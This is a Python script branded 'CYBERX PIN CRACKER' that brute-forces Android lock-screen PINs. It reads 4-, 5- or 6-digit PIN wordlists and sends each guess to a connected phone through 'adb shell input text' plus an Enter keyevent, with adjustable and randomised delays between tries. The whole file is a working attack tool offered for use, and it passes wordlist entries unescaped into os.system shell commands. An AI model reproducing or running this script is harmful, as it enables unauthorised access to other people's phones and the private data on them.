import os
import time
import sys
import shutil
import random
import threading

# 🎭 Colors
GREEN = "\033[1;32m"
RESET = "\033[0m"

paused = False

# ================= UI FUNCTIONS ================= #

def slow_print(text, delay=0.01):
    for ch in text:
        sys.stdout.write(ch)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def loading():
    for i in range(0, 101, 5):
        bar = "#" * (i // 2) + "-" * (50 - (i // 2))
        sys.stdout.write(f"\r{GREEN}[{bar}] {i}%{RESET}")
        sys.stdout.flush()
        time.sleep(0.05)
    print("\n")

def progress_bar(current, total):
    percent = int((current / total) * 100)
    bars = int(percent / 2)
    bar_line = "#" * bars + "-" * (50 - bars)
    sys.stdout.write(f"\r{GREEN}[{bar_line}] {percent}%{RESET}")
    sys.stdout.flush()

# ⏸ Pause system
def pause_listener():
    global paused
    while True:
        input()
        paused = not paused
        if paused:
            print(GREEN + "\n[⏸ PAUSED] Press ENTER to resume..." + RESET)
        else:
            print(GREEN + "\n[▶ RESUMED]" + RESET)

# ================= START SCREEN ================= #

os.system("clear")

width = shutil.get_terminal_size().columns
text = " CYBERX PIN CRACKER "
side = (width - len(text)) // 2

print(GREEN)
print("#" * width)
print("#" * side + text + "#" * side)
print("#" * width)
print(RESET)

slow_print(GREEN + "[+] Initializing CyberX System..." + RESET)
time.sleep(0.5)

slow_print(GREEN + "[+] Loading Modules..." + RESET)
time.sleep(0.5)

loading()

slow_print(GREEN + "[✔] System Ready!\n" + RESET)

slow_print(GREEN +  "CREATED  BY  CYBER X\n" + RESET)
# ================= MENU ================= #

WL_PATH = "/data/data/com.termux/files/home/PIN-CRACKER/WL/"

print(GREEN + "Select Option:\n" + RESET)
print("1 → 4 DIGIT PIN")
print("2 → 5 DIGIT PIN")
print("3 → 6 DIGIT PIN")
print("4 → USE YOUR OWN WORDLIST\n")

choice = input("Enter choice: ").strip()

if choice == "1":
    file_path = WL_PATH + "4D_WL.txt"
elif choice == "2":
    file_path = WL_PATH + "5D_WL.txt"
elif choice == "3":
    file_path = WL_PATH + "6D_WL.txt"
elif choice == "4":
    file_path = input("Enter full path: ").strip()
else:
    print("❌ Invalid choice!")
    exit()

# ================= LOAD WL ================= #

try:
    with open(file_path, "r") as f:
        messages = [line.strip() for line in f if line.strip()]
except:
    print("❌ File not found!")
    exit()

total = len(messages)

print(GREEN + f"\n📂 Loaded {total} entries\n" + RESET)

# ================= SETTINGS ================= #

before_type = float(input("Delay BEFORE typing (default 1): ") or 1)
before_send = float(input("Delay BEFORE send (default 1): ") or 1)
after_send = float(input("Delay AFTER send (default 2): ") or 2)

use_random = input("Use random delay? (y/n): ").lower()

print(GREEN + "\n🚀 Starting... (Press ENTER to Pause/Resume)\n" + RESET)

# Start pause thread
threading.Thread(target=pause_listener, daemon=True).start()

# ================= MAIN LOOP ================= #

count = 0

for msg in messages:

    while paused:
        time.sleep(0.5)

    safe_msg = msg.replace(" ", "_")

    print(GREEN + f"\n[{count+1}/{total}] Trying: {msg}" + RESET)

    time.sleep(before_type)
    os.system(f'adb shell input text "{safe_msg}"')
    time.sleep(before_send)
    os.system("adb shell input keyevent 66")

    if use_random == "y":
        delay = random.uniform(1.5, 3.5)
    else:
        delay = after_send

    time.sleep(delay)

    count += 1
    progress_bar(count, total)

# ================= END ================= #

print(GREEN + "\n\n✅ Completed!" + RESET)
slow_print(GREEN + "[+] Developed by CYBERX 😈" + RESET)
